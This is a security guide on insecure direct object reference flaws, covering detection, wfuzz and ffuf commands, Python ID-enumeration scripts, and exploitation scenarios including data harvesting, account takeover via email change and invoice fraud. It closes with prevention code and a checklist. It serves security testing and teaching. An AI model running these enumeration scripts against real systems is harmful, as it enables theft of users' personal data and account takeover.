# Insecure Direct Object Reference (IDOR) - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Attack Mechanics](#attack-mechanics)
3. [Detection Techniques](#detection-techniques)
4. [Scanning Tools](#scanning-tools)
5. [Exploitation Scenarios](#exploitation-scenarios)
6. [Advanced Techniques](#advanced-techniques)
7. [IDOR in Modern Applications](#idor-in-modern-applications)
8. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

Insecure Direct Object Reference (IDOR) is a type of access control vulnerability that occurs when an application exposes a reference to an internal implementation object (such as a file, directory, database record) without proper authorization checks.

**Impact**:
- Unauthorized data access (horizontal privilege escalation)
- Access to administrative functions (vertical privilege escalation)
- Data modification/deletion
- Account takeover
- Privacy violations
- Compliance violations (GDPR, HIPAA, etc.)

**Common Vulnerable Patterns**:
- Sequential numeric IDs
- Predictable identifiers
- Exposed primary keys
- File paths in parameters
- Missing authorization checks

---

## Attack Mechanics

### Basic IDOR Pattern

```
1. User accesses their resource: /api/user/documents?userId=1001
2. Attacker modifies ID: /api/user/documents?userId=1002
3. Application returns user 1002's documents (no auth check)
4. Attacker accesses other users' data
```

### Types of IDOR

**1. Horizontal Privilege Escalation**:
```
Same privilege level, different user
User A accesses User B's data
Both are regular users
```

**2. Vertical Privilege Escalation**:
```
Lower privilege to higher
User accesses Admin data
Regular user → Administrator
```

**3. Blind IDOR**:
```
No direct reflection in response
But action is performed server-side
Example: Blind profile update
```

### Common ID Types

**Sequential Numeric**:
```
userId=1, 2, 3, 4...
orderId=1000, 1001, 1002...
invoiceId=1, 2, 3...
```

**UUID/GUID**:
```
userId=550e8400-e29b-41d4-a716-446655440000
Less predictable, but still vulnerable if no auth check
```

**Hash-based**:
```
userId=a1b2c3d4e5f6
May be MD5/SHA hash of ID or username
Can be cracked or enumerated
```

**Encoded**:
```
userId=MTAwMQ== (Base64 encoded "1001")
userId=31303031 (Hex encoded "1001")
Obfuscation, not security
```

---

## Detection Techniques

### Manual Testing Workflow

**Step 1: Identify Object References**
```
Look for parameters with IDs:
- URL parameters: ?id=, ?userId=, ?orderId=, ?docId=
- POST body: {"userId": 123, "orderId": 456}
- Cookies: userId=1001
- Headers: X-User-Id: 1001
- File paths: /download/invoice_123.pdf
```

**Step 2: Create Test Accounts**
```
Create 2+ accounts:
- User A (low privilege)
- User B (low privilege)
- Admin (high privilege)

This allows testing:
- Horizontal: A → B
- Vertical: A → Admin
```

**Step 3: Map Functionality**
```
With User A, identify:
- Profile page → userId=1001
- Documents → docId=5001, 5002
- Orders → orderId=7001
- Messages → msgId=9001

Note all IDs and endpoints
```

**Step 4: Test Access Control**
```
Login as User A
Access User A's resource: /api/profile?userId=1001 ✓

Login as User B
Access User B's resource: /api/profile?userId=1002 ✓

Login as User B
Access User A's resource: /api/profile?userId=1001
- Should return 403 Forbidden
- If returns User A's data → IDOR!
```

**Step 5: Test Vertical Escalation**
```
Login as User A (regular user)
Try admin endpoints with guessed admin ID:
- /api/admin/users?adminId=1
- /api/admin/settings?userId=1

If accessible → Vertical IDOR
```

### Automated Detection Indicators

**Response Analysis**:
```
Compare responses:
1. Own resource (userId=1001) → 200 OK, own data
2. Other's resource (userId=1002) →
   - 200 OK, other's data → IDOR vulnerable
   - 403 Forbidden → Protected (good)
   - 404 Not Found → May be protected
   - 302 Redirect → Check destination
```

**Response Differences**:
```
Vulnerable:
- Same status code (200)
- Different data in response
- Same structure, different content

Protected:
- Different status code (403, 401)
- Error message
- Redirect to login/home
```

---

## Scanning Tools

### 1. Burp Suite - Autorize Extension

**Setup**:
```
1. Install Autorize from BApp Store
2. Configure:
   - Low-privileged user session
   - High-privileged user session (optional)
3. Browse application with high-priv user
4. Autorize replays requests with low-priv session
5. Analyzes if low-priv can access high-priv resources
```

**Features**:
- Automatic request replay
- Session comparison
- Response analysis
- Highlights unauthorized access

**Usage**:
```
1. Configure "Low Privilege User" cookie/token
2. Browse as "High Privilege User"
3. Check Autorize tab for results
4. Red/Orange = Potential IDOR/Auth bypass
```

### 2. Burp Suite - AuthMatrix Extension

**Purpose**: Test role-based access control

**Setup**:
```
1. Install AuthMatrix
2. Define roles: Admin, User, Guest
3. Add session tokens for each role
4. Add requests to test
5. Run matrix test
```

**Output**:
```
Matrix showing which roles can access which endpoints:
                Admin   User    Guest
/admin/users     ✓      ✗       ✗
/user/profile    ✓      ✓       ✗
/user/settings   ✓      ✓       ✗

✗ in User column for /admin/users = Good
✓ in User column for /admin/users = IDOR!
```

### 3. Burp Suite Intruder

**Numeric ID Enumeration**:
```
1. Send request to Intruder
2. Mark ID parameter
3. Payload type: Numbers
4. From: 1, To: 10000, Step: 1
5. Grep-Match: Success indicators
6. Start attack
7. Analyze responses:
   - Same length → Same content (likely protected)
   - Different length → Different data (likely IDOR)
```

**Payload Examples**:
```
Payload type: Numbers (1-1000)
Payload type: Custom list (base64 encoded IDs)
Payload type: Brute forcer (short UUIDs)
```

### 4. wfuzz

```bash
# Enumerate user IDs
wfuzz -z range,1-1000 https://target.com/api/user/FUZZ

# Hide specific response codes
wfuzz -z range,1-1000 --hc 404,403 https://target.com/api/user/FUZZ

# Hide specific response size
wfuzz -z range,1-1000 --hs 1234 https://target.com/download?docId=FUZZ

# Show only specific response sizes
wfuzz -z range,1-1000 --ss 5000-10000 https://target.com/api/invoice/FUZZ

# POST request
wfuzz -z range,1-1000 -X POST -d "userId=FUZZ" https://target.com/api/profile

# Multiple parameters
wfuzz -z range,1-100 -z range,1-100 https://target.com/msg?userId=FUZZ&msgId=FUZ2Z
```

### 5. ffuf

```bash
# Basic ID enumeration
ffuf -u https://target.com/api/user/FUZZ -w <(seq 1 1000)

# Filter by status code
ffuf -u https://target.com/api/user/FUZZ -w ids.txt -mc 200

# Filter by response size
ffuf -u https://target.com/api/user/FUZZ -w ids.txt -fs 1234

# Match regex in response
ffuf -u https://target.com/api/user/FUZZ -w ids.txt -mr "email"

# POST data
ffuf -u https://target.com/api/profile -w ids.txt -X POST -d "userId=FUZZ"

# Custom headers
ffuf -u https://target.com/api/user/FUZZ -w ids.txt -H "Authorization: Bearer TOKEN"

# Rate limiting
ffuf -u https://target.com/api/user/FUZZ -w ids.txt -rate 10
```

### 6. Manual Testing Scripts

**Python - Test IDOR**:
```python
import requests

# Two user sessions
session_a = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."  # User A token
session_b = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."  # User B token

# User A's ID
user_a_id = 1001

# User B tries to access User A's data
headers = {'Authorization': f'Bearer {session_b}'}
r = requests.get(f'https://target.com/api/profile?userId={user_a_id}', headers=headers)

if r.status_code == 200 and 'user_a_email@example.com' in r.text:
    print("[+] IDOR Vulnerable! User B can access User A's profile")
else:
    print("[-] Protected against IDOR")
```

**Python - Enumerate IDs**:
```python
import requests

headers = {'Authorization': 'Bearer YOUR_TOKEN'}
base_url = 'https://target.com/api/document/'

for doc_id in range(1, 1001):
    r = requests.get(base_url + str(doc_id), headers=headers)

    if r.status_code == 200:
        print(f"[+] Document {doc_id} accessible")
        # Check if it's your own document
        if 'your_email@example.com' not in r.text:
            print(f"[!] IDOR! Accessing someone else's document {doc_id}")
    elif r.status_code == 403:
        print(f"[-] Document {doc_id} forbidden (expected)")
    elif r.status_code == 404:
        print(f"[-] Document {doc_id} not found")
```

---

## Exploitation Scenarios

### Scenario 1: Profile Access (Horizontal Escalation)

```
Application: Social network
Endpoint: GET /api/profile?userId=1001

Normal flow:
User A (userId=1001) requests: /api/profile?userId=1001
Response: User A's profile (name, email, DOB, address)

IDOR Attack:
User B (userId=1002) requests: /api/profile?userId=1001
Response: User A's profile ← Should be forbidden

Impact: Privacy violation, data leakage

Exploitation:
1. Create account → userId=1002
2. Enumerate: /api/profile?userId=1, 2, 3, ..., 10000
3. Extract all user profiles
4. Harvest emails for phishing
```

### Scenario 2: Document Download (File Access)

```
Application: Document management system
Endpoint: GET /download?docId=5001

Normal flow:
User A downloads: /download?docId=5001 (own document)

IDOR Attack:
User A downloads: /download?docId=5002 (User B's document)
Response: Confidential document from User B

Impact: Data breach, confidential info disclosure

Exploitation:
1. Note document ID pattern
2. Enumerate: /download?docId=1 through 99999
3. Download all accessible documents
4. Exfiltrate sensitive data
```

### Scenario 3: Order Access (E-commerce)

```
Application: Online shop
Endpoint: GET /api/order/12345

Normal flow:
User views own order: /api/order/12345

IDOR Attack:
User modifies ID: /api/order/12346
Response: Different user's order (items, address, payment method)

Impact: Privacy violation, PCI-DSS violation

Exploitation:
1. Place test order → orderId=12345
2. Enumerate nearby: 12344, 12343, 12346, 12347
3. Extract:
   - Customer names & addresses
   - Purchase history
   - Partial credit card numbers
```

### Scenario 4: Admin Panel Access (Vertical Escalation)

```
Application: Admin dashboard
Endpoint: /admin/users?userId=1

Normal flow:
Admin (userId=1) accesses: /admin/users?userId=1

IDOR Attack:
Regular user (userId=1001) guesses: /admin/users?userId=1
Response: Admin panel with user management

Impact: Vertical privilege escalation, full compromise

Exploitation:
1. Guess admin ID (usually 1, 2, admin, root)
2. Access admin endpoints
3. Create admin user
4. Take over application
```

### Scenario 5: Account Takeover via IDOR

```
Application: User settings
Endpoint: POST /api/update-email
Body: {"userId": 1001, "newEmail": "new@example.com"}

Normal flow:
User A updates own email

IDOR Attack:
User B sends: {"userId": 1001, "newEmail": "attacker@evil.com"}
Response: Email updated successfully

Impact: Account takeover

Exploitation:
1. Change victim's email
2. Click "Forgot Password"
3. Reset link sent to attacker@evil.com
4. Take over account
```

### Scenario 6: API Key Exposure

```
Application: API management
Endpoint: GET /api/keys?userId=1001

Normal flow:
User views own API keys

IDOR Attack:
User modifies ID: /api/keys?userId=1002
Response: Another user's API keys

Impact: API abuse, unauthorized access

Exploitation:
1. Enumerate user IDs
2. Collect API keys
3. Use keys for:
   - Free API calls
   - Quota abuse
   - Impersonation
```

### Scenario 7: Invoice Manipulation

```
Application: Billing system
Endpoint: POST /api/invoice/update
Body: {"invoiceId": 7001, "amount": 10.00}

Normal flow:
User pays invoice

IDOR Attack:
User modifies invoice ID: {"invoiceId": 7002, "amount": 0.01}
Response: Invoice updated (different user's invoice!)

Impact: Financial fraud

Exploitation:
1. Find invoice IDs
2. Reduce amount to $0.01
3. Pay minimal amount
4. Mark as paid
```

---

## Advanced Techniques

### 1. UUID/GUID Enumeration

**Even UUIDs can be vulnerable**:
```
UUIDs may use:
- Timestamp (UUIDv1)
- MD5 hash of namespace/name (UUIDv3)
- Random (UUIDv4)
- SHA-1 hash (UUIDv5)

UUIDv1 is predictable:
- Contains timestamp
- Contains MAC address
- Can be predicted/enumerated
```

**Attack**:
```python
import uuid
import time

# Generate UUIDs around current time
for i in range(-1000, 1000):
    timestamp = time.time() + i
    # Generate UUIDv1 with modified timestamp
    # Test if valid
```

### 2. Hash-Based ID Cracking

**MD5 hash IDs**:
```bash
# If userId=5f4dcc3b5aa765d61d8327deb882cf99 (MD5 of "password")

# Crack with hashcat
hashcat -m 0 hashes.txt wordlist.txt

# Or guess pattern
echo -n "user123" | md5sum
# Test: userId=<md5_output>
```

### 3. Encoded ID Decoding

**Base64**:
```bash
# userId=MTAwMQ==
echo "MTAwMQ==" | base64 -d
# Result: 1001

# Modify and re-encode
echo -n "1002" | base64
# Result: MTAwMg==
# Test: userId=MTAwMg==
```

**Hex**:
```bash
# userId=31303031 (hex of "1001")
echo "31303031" | xxd -r -p
# Result: 1001

# Encode new ID
echo -n "1002" | xxd -p
# Result: 31303032
```

### 4. Blind IDOR Detection

**No visible response difference**:
```
POST /api/update-bio
Body: {"userId": 1001, "bio": "Attacker was here"}

Response: {"success": true}  # No data returned

Detection:
1. Update victim's bio (userId=1002)
2. View victim's profile publicly
3. Check if bio changed
4. If yes → Blind IDOR
```

**Time-based detection**:
```
Some operations take longer:
- DELETE slower than failed DELETE
- UPDATE slower than failed UPDATE

Measure response times to detect blind IDOR
```

### 5. Mass Assignment IDOR

**Exploiting mass assignment + IDOR**:
```
POST /api/update-profile
Body: {"userId": 1001, "name": "Alice", "role": "admin"}

If userId modifiable AND role assignable:
1. Change userId to victim
2. Upgrade victim to admin
3. Or downgrade admin to user
```

### 6. Chaining IDOR

**IDOR → XSS**:
```
1. Find IDOR in bio update
2. Inject XSS in victim's bio
3. Anyone viewing victim's profile gets XSSed
```

**IDOR → Account Takeover**:
```
1. Find IDOR in email update
2. Change victim's email
3. Use password reset
4. Take over account
```

---

## IDOR in Modern Applications

### GraphQL IDOR

```graphql
# Query
query {
  user(id: 1001) {
    id
    name
    email
    ssn
  }
}

# IDOR Attack
query {
  user(id: 1002) {  # Different user
    id
    name
    email
    ssn  # Should be unauthorized
  }
}
```

### REST API IDOR

```
GET /api/v1/users/1001
GET /api/v1/users/1001/documents
GET /api/v1/users/1001/orders
GET /api/v1/users/1001/messages

# Test with different IDs
GET /api/v1/users/1002
...
```

### Mobile API IDOR

```
Mobile apps often use:
- User IDs in requests
- Sequential IDs
- Weak auth checks

Intercept traffic:
1. Use Burp Suite Mobile Assistant
2. Intercept API calls
3. Test IDOR on API endpoints
```

### WebSocket IDOR

```json
// Subscribe to user updates
{"action": "subscribe", "userId": 1001}

// IDOR Attack
{"action": "subscribe", "userId": 1002}

// May receive other user's real-time updates
```

---

## Prevention & Mitigation

### 1. Indirect Object References

```python
# BAD - Direct database ID
/api/documents?docId=12345 (database primary key)

# GOOD - Indirect reference (mapping)
/api/documents?docRef=a7f3k9m2

# Server-side mapping
doc_references = {
    'a7f3k9m2': {'db_id': 12345, 'owner': 1001},
    'b8e4j8n3': {'db_id': 12346, 'owner': 1002}
}

# Validate ownership
if doc_references[ref]['owner'] != current_user_id:
    return 403
```

### 2. Proper Authorization Checks

```python
# BAD - No authorization
@app.route('/api/document/<int:doc_id>')
def get_document(doc_id):
    doc = Database.get_document(doc_id)
    return jsonify(doc)

# GOOD - Check ownership
@app.route('/api/document/<int:doc_id>')
@login_required
def get_document(doc_id):
    doc = Database.get_document(doc_id)

    # Authorization check
    if doc.owner_id != current_user.id:
        abort(403, "Unauthorized")

    return jsonify(doc)
```

### 3. Use UUIDs (with auth checks)

```python
# Better than sequential IDs (but still need auth)
import uuid

# Generate random UUID
doc_id = str(uuid.uuid4())
# Example: 550e8400-e29b-41d4-a716-446655440000

# Still validate ownership!
if doc.owner_id != current_user.id:
    abort(403)
```

### 4. Session-Based Access

```python
# Don't trust client-provided IDs
# Use session to determine user

@app.route('/api/my-profile')
@login_required
def get_profile():
    user_id = session['user_id']  # From session, not parameter
    profile = Database.get_profile(user_id)
    return jsonify(profile)
```

### 5. Role-Based Access Control (RBAC)

```python
def require_permission(permission):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            if not current_user.has_permission(permission):
                abort(403)
            return f(*args, **kwargs)
        return wrapped
    return decorator

@app.route('/admin/users')
@require_permission('admin.users.view')
def view_users():
    # Only accessible with permission
    return jsonify(users)
```

### 6. Consistent Authorization Logic

```python
# Centralize authorization checks
class AuthorizationService:
    @staticmethod
    def can_access_document(user, document):
        # Centralized logic
        if document.owner_id == user.id:
            return True
        if user.has_role('admin'):
            return True
        if document.is_public:
            return True
        return False

# Use everywhere
@app.route('/api/document/<int:doc_id>')
@login_required
def get_document(doc_id):
    doc = Database.get_document(doc_id)

    if not AuthorizationService.can_access_document(current_user, doc):
        abort(403)

    return jsonify(doc)
```

### 7. Audit Logging

```python
# Log all access attempts
import logging

@app.route('/api/document/<int:doc_id>')
@login_required
def get_document(doc_id):
    doc = Database.get_document(doc_id)

    # Log access attempt
    logging.info(f"User {current_user.id} accessing document {doc_id}")

    if doc.owner_id != current_user.id:
        # Log unauthorized attempt
        logging.warning(f"UNAUTHORIZED: User {current_user.id} attempted to access document {doc_id} owned by {doc.owner_id}")
        abort(403)

    return jsonify(doc)
```

### 8. Rate Limiting

```python
# Prevent mass enumeration
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: current_user.id)

@app.route('/api/document/<int:doc_id>')
@limiter.limit("100/hour")
@login_required
def get_document(doc_id):
    # Rate limited to 100 requests per hour
    ...
```

### 9. Monitoring & Alerting

```python
# Detect IDOR attempts
def detect_enumeration(user_id):
    # Check if user accessed many sequential IDs
    recent_accesses = get_recent_accesses(user_id, minutes=5)

    if len(recent_accesses) > 50:
        # Potential enumeration attack
        alert_security_team(user_id, "Possible IDOR enumeration")
        block_user(user_id, minutes=30)
```

### Security Checklist

- [ ] All object access has authorization checks
- [ ] Authorization logic centralized
- [ ] Indirect object references used (where possible)
- [ ] UUIDs used instead of sequential IDs (with auth)
- [ ] User context from session, not parameters
- [ ] Role-based access control implemented
- [ ] Audit logging for all accesses
- [ ] Rate limiting on sensitive endpoints
- [ ] Monitoring for enumeration attempts
- [ ] Regular security testing (Autorize, manual)
- [ ] Code reviews focus on authorization
- [ ] Automated IDOR tests in CI/CD

---

**Additional Resources**:
- OWASP Top 10: Broken Access Control
- PortSwigger Access Control Labs
- HackTricks - IDOR
- OWASP Testing Guide - Authorization Testing
